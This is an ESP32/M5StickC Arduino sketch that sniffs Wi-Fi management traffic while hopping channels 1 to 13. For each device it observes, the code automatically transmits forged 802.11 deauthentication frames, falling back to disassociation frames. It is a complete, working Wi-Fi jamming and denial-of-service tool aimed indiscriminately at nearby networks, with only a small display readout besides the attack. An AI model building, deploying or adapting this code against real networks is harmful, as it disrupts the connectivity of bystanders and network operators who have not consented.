#include <M5StickC.h>
#include "freertos/FreeRTOS.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_system.h"
#include "esp_event.h"
#include "esp_event_loop.h"
#include "nvs_flash.h"
#include "driver/gpio.h"

//RSSI: -30~-120
#define WIFI_CHANNEL_SWITCH_INTERVAL  (500)
#define WIFI_CHANNEL_MAX               (13)

uint8_t level = 0, channel = 1;
static wifi_country_t wifi_country = {.cc="CN", .schan = 1, .nchan = 13}; //Most recent esp32 library struct

const uint8_t deauthPacket[] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
    /*  2 - 3  */ 0x3A, 0x01,                         // duration
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
    /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
};

typedef struct sta_ap{
  char* type;
  int8_t rssi;
  uint8_t channel;
  uint8_t addr1[6]; /* receiver address */
  uint8_t addr2[6]; /* sender address */
  uint8_t addr3[6]; /* filtering address */
  struct sta_ap *next;
} sta_ap_t;

sta_ap_t* sta_ap = NULL;
sta_ap_t* sta_ap_list = NULL;

typedef struct {
  unsigned frame_ctrl:16;
  unsigned duration_id:16;
  uint8_t addr1[6]; /* receiver address */
  uint8_t addr2[6]; /* sender address */
  uint8_t addr3[6]; /* filtering address */
  unsigned sequence_ctrl:16;
  uint8_t addr4[6]; /* optional */
} wifi_ieee80211_mac_hdr_t;

typedef struct {
  wifi_ieee80211_mac_hdr_t hdr;
  uint8_t payload[0]; /* network data ended with 4 bytes csum (CRC32) */
} wifi_ieee80211_packet_t;

static esp_err_t event_handler(void *ctx, system_event_t *event);
static void wifi_sniffer_init(void);
static void wifi_sniffer_set_channel(uint8_t channel);
static const char *wifi_sniffer_packet_type2str(wifi_promiscuous_pkt_type_t type);
static void wifi_sniffer_packet_handler(void *buff, wifi_promiscuous_pkt_type_t type);

TFT_eSprite tftSprite = TFT_eSprite(&M5.Lcd);
int dev_num = 0;

typedef uint8_t MacAddr[6];
uint16_t seqnum;
uint8_t buffer[200];

esp_err_t raw(const uint8_t* packet, int32_t len, bool en_sys_seq) {
    return esp_wifi_80211_tx(WIFI_IF_AP, packet, len, en_sys_seq);
}

esp_err_t deauth(const MacAddr ap, const MacAddr station,
                 const MacAddr bssid, uint8_t reason, uint8_t channel) {

    esp_err_t res;
    memcpy(buffer, deauthPacket, sizeof(deauthPacket));

    memcpy(&buffer[4], ap, 6);
    memcpy(&buffer[10], station, 6);
    memcpy(&buffer[16], bssid, 6);
    memcpy(&buffer[22], &seqnum, 2);
    buffer[24] = reason;

    res = raw(buffer, sizeof(deauthPacket), true);
    if(res == ESP_OK) return ESP_OK;
    buffer[0] = 0xa0;
    return raw(buffer, sizeof(deauthPacket), true);
}

esp_err_t event_handler(void *ctx, system_event_t *event)
{
  return ESP_OK;
}

void wifi_sniffer_init(void) {
  nvs_flash_init();
  tcpip_adapter_init();
  ESP_ERROR_CHECK( esp_event_loop_init(event_handler, NULL) );
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  ESP_ERROR_CHECK( esp_wifi_init(&cfg) );
  ESP_ERROR_CHECK( esp_wifi_set_country(&wifi_country) ); /* set country for channel range [1, 13] */
  ESP_ERROR_CHECK( esp_wifi_set_storage(WIFI_STORAGE_RAM) );
  ESP_ERROR_CHECK( esp_wifi_set_mode(WIFI_MODE_NULL) );
  ESP_ERROR_CHECK( esp_wifi_start() );
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_packet_handler);
}

void wifi_sniffer_set_channel(uint8_t channel) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

const char * wifi_sniffer_packet_type2str(wifi_promiscuous_pkt_type_t type) {
  switch(type) {
  case WIFI_PKT_MGMT: return "MGMT";
  case WIFI_PKT_DATA: return "DATA";
  default:  
  case WIFI_PKT_MISC: return "MISC";
  }
}

void wifi_sniffer_packet_handler(void* buff, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT)
    return;

  const wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)buff;
  const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)ppkt->payload;
  const wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;
  
  if(hdr->addr1[0]==0xFF&&hdr->addr1[1]==0xFF&&hdr->addr1[2]==0xFF&&hdr->addr1[3]==0xFF&&hdr->addr1[4]==0xFF&&hdr->addr1[5]==0xFF){

  }else{
    dev_num++;
    const MacAddr sta = {hdr->addr1[0],hdr->addr1[1],hdr->addr1[2],hdr->addr1[3],hdr->addr1[4],hdr->addr1[5]};
    const MacAddr ap = {hdr->addr2[0],hdr->addr2[1],hdr->addr2[2],hdr->addr2[3],hdr->addr2[4],hdr->addr2[5]};
    deauth(sta,ap,ap,1,1);
    tftSprite.fillScreen(BLACK);
    tftSprite.setTextColor(WHITE);
    tftSprite.setTextSize(1);
    tftSprite.setCursor(0, 10);
    tftSprite.printf(
      "ADDR1=%02x:%02x:%02x:%02x:%02x:%02x\n"
      "ADDR2=%02x:%02x:%02x:%02x:%02x:%02x\n"
      "rssi:%d chl:%d dev:%d",
      hdr->addr1[0],hdr->addr1[1],hdr->addr1[2],hdr->addr1[3],hdr->addr1[4],hdr->addr1[5],
      hdr->addr2[0],hdr->addr2[1],hdr->addr2[2],hdr->addr2[3],hdr->addr2[4],hdr->addr2[5],
      ppkt->rx_ctrl.rssi,ppkt->rx_ctrl.channel,dev_num
    );
    tftSprite.pushSprite(0, 0);
  }
}

void setup() {
  M5.begin();
  tftSprite.createSprite(80, 160);
  
  Serial.begin(115200);
  delay(10);
  wifi_sniffer_init();
}

void loop() {
  delay(1000); // wait for a second
  vTaskDelay(WIFI_CHANNEL_SWITCH_INTERVAL / portTICK_PERIOD_MS);
  wifi_sniffer_set_channel(channel);
  channel = (channel % WIFI_CHANNEL_MAX) + 1;
}
